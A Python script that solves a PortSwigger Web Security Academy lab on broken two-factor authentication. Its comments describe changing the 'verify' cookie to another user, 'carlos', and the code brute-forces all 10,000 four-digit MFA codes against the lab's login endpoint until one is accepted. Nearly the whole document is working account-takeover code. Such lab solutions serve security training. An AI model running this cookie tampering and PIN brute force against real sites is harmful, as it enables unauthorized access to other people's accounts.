#!/usr/bin/env python3

# Lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

# After logging in with valid credentials and intercepting the response (modifying the "verify" cookie to contain "carlos" instead of the valid user), we can brute force the 2FA pin.
# Although it's faster than free BurpSuite, 10000 combinations take some time. One could add threading etc. to make it faster.
# Once the correct pin is found, we can enter the correct pin and continue the 2FA check, effectively logging in as carlos.

import requests

for pin in range(10000):
	header = { "Host": "0af7005e0449a000c039cccb009d004c.web-security-academy.net", "Cookie": "verify=carlos; session=Pf8aB6ynzN3KXDlFAm7GofiMq2ojHb00"}
	print(pin)
	r = requests.post("https://0af7005e0449a000c039cccb009d004c.web-security-academy.net/login2", data={"mfa-code": f"{pin:04}"}, headers=header)
	if "Incorrect" not in r.text:
		break

print("done")
